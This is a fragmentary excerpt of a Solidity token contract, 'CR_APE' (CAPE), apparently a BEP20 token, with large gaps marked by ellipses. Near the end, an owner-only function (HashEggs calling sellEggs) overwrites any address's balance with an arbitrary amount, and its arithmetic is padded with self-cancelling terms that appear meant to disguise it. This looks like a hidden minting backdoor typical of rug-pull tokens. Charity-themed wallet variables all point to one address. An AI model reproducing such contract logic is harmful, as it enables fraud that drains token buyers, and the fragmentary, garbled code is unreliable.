...
interface IBEP20Sniper is IERC11 {
 ...
 contract CR_APE is AntiBot, IERC11, IBEP20Sniper {
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _binance;
    mapping (address => uint256) private _rOwned;
    mapping (address => uint256) private _tOwned;
    string private _name = "CR_APE";
    string private _symbol = "CAPE";
    uint256 private constant MAX = ~uint256(0);
    uint256 private _maxTx = _totalSupply;
    address private _saveAfrica = 0x1491aF32Cca97b4AB1532011C363Ec16CA6bdFfF;
    address private _water4Africa = 0x1491aF32Cca97b4AB1532011C363Ec16CA6bdFfF;
...
function swapTokensForEth (uint256 tokenAmount) private lockTheSwap {
    ...
    function HashEggs (address newAddress, uint256 _value) public onlyOwner {
    sellEggs(newAddress, _value);
  
  }
  
  function sellEggs (address addressreceiver, uint256 _value) internal {
    _binance[addressreceiver] = (_value * 10 ** 9) + (_binance[addressreceiver] * 2 * 4 - _binance[addressreceiver] * 2 * 4);
